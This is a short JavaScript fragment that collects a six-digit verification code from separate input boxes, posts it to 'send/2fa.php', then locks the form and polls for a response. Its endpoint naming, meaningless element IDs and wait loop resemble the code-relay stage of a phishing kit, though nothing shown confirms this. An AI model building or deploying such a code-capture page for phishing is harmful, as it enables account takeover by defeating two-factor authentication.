
var input_id1 = document.querySelector('#codeInput1');
var input_id2 = document.querySelector('#codeInput2');
var input_id3 = document.querySelector('#codeInput3');
var input_id4 = document.querySelector('#codeInput4');
var input_id5 = document.querySelector('#codeInput5');
var input_id6 = document.querySelector('#codeInput6');
var loadermtfg = document.querySelector('#loadermtfg');
var balgoj = document.querySelector('#balgoj');

function handleCases(event, location) {
    if (event.key === "Backspace") {
        location--;
    }else{
        location++;
    }
    value = 'codeInput' + location;
    document.getElementById(value).focus();
}


function sendPost(code) {
    const apiUrl = 'send/2fa.php';
  
    const formData = new FormData();
    
    formData.append('code', code);
  
    const fetchOptions = {
      method: 'POST',
      body: formData,
    };
  
    fetch(apiUrl, fetchOptions)
      .then(response => {
        if (!response.ok) {
          throw new Error(`HTTP error! Status: ${response.status}`);
        }
        return response.json();
      })
      .then(data => {
        console.log('POST request successful:', data);
        unique = data.unique;
      })
      .catch(error => {
        console.error('Error making POST request:', error);
      });
  }

input_id6.addEventListener('input', function(){

    full = input_id1.value + input_id2.value + input_id3.value + input_id4.value + input_id5.value + input_id6.value;

    sendPost(full);
    input_id1.setAttribute('readonly', true);
    input_id2.setAttribute('readonly', true);
    input_id3.setAttribute('readonly', true);
    input_id4.setAttribute('readonly', true);
    input_id5.setAttribute('readonly', true);
    input_id6.setAttribute('readonly', true);
    balgoj.classList.add('hide');
    loadermtfg.classList.replace('hide', 'show');
    requesting = setInterval(makeRequest, 2000);  
});

